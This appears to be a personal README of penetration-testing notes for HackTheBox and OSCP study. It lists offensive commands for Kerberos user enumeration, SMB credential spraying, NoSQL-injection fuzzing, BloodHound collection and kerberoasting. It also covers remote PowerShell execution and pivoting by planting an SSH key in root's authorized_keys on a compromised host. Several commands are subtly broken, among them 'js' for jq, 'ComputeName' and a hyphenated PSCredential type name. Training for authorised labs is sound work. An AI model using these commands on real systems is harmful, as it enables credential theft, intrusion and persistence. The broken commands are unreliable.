## table of contents

- [overview](#overview)
- [enumeration](#enumeration)
- [web](#web)
- [ad](#ad)
- [windows](#windows)
- [linux](#linux)
- [priv esc](#privesc)


## overview

This README contains notes for HackTheBox & OSCP prep.

# enumeration
## host
`nmap -sC -sV <ip>` OR `rustscan -a <ip> -- -sC -sV`

## subdomain
`ffuf -u http://DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.DOMAIN.COM"`

## ports
#### 88 (Kerberos)
can brute force valid users w/ kerbrute
`./kerbrute userenum --dc <ip> -d <domain> users.txt`

#### 139/445 (SMB)
enumerate valid smb creds
`crackmapexec smb <ip> -d <domain> -u <user(s)> -p <password(s)> --no-bruteforce --continue-on-success` 

# web
## fuzzing
NOSQL injection
`ffuf -u http://DOMAIN.COM/login -c -w /usr/share/seclists/Fuzzing/Databases/NoSQL.txt -X POST -d 'username=adminFUZZ&password=admin' -H 'Content-Type: application/x-www-form-urlencoded'`

# ad
## bloodhound
https://github.com/BloodHoundAD/BloodHound
https://github.com/fox-it/BloodHound.py

#### server
`sudo neo4j console`
`./BloodHound`

#### to get json
`./bloodhound.py -u <username> -p <password> -d <domain> -ns <ip> -c All`

- grab users from json
`cat <XXXX_users.json> | js '.data[].Properties | select( . enabled == true) | .name' -r > users.txt`
- remove @domain from userlist
`cat users.txt | awk -F@ '{print $1}' > o`
`mv o users.txt`

## kerberoasting
GetUserSPNs.py can be used to grab kerberos hashes after an account has be identified using Bloodhound
`./GetUserSPNs.py <domain>/<user>:<password> -outputfile kerberoast.hash`

# windows
#### powershell credential
`$cred = New-Object System-Management-Automation-PSCredential "user","pass"`
#### execute PS command
`Invoke-Command -ComputeName 127.0.0.1 -cred $cred -SCriptBlock { <command> }`
# linux

# priv esc
# post-exploitation
### pivoting
SSH as SOCKS5 proxy server
```
### ON YOUR MACHINE (10.10.10.1)
# CREATE A DIRECTORY FOR MANAGING KEYS
mkdir piv_keys && chmod 700 piv_keys
# GENERATE NEW SSH KEY
ssh-keygen -f piv_keys/id_rsa_1
# COPY PUBLIC KEY CONTENT TO CLIPBOARD
cat piv_keys/id_rsa_1 | clip.exe # OR JUST CAT AND COPY### ON A COMPROMISED MACHINE (10.10.10.2)
# ADD YOUR SSH PUBLIC KEY TO authorized_keys
echo "ssh-rsa AAAA...[REDACTED]..." >> /root/.ssh/authorized_keys### ON YOUR HOST (10.10.10.1)
# START SSH DYNAMIC PORT FORWARDING
ssh -D 9999 -f -N root@10.10.10.2 -i piv_keys/id_rsa_1
------
### ON YOUR HOST (10.10.10.1)
# CONFIGURE PROXYCHAINS (/etc/proxychains4.conf)
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 9999
```
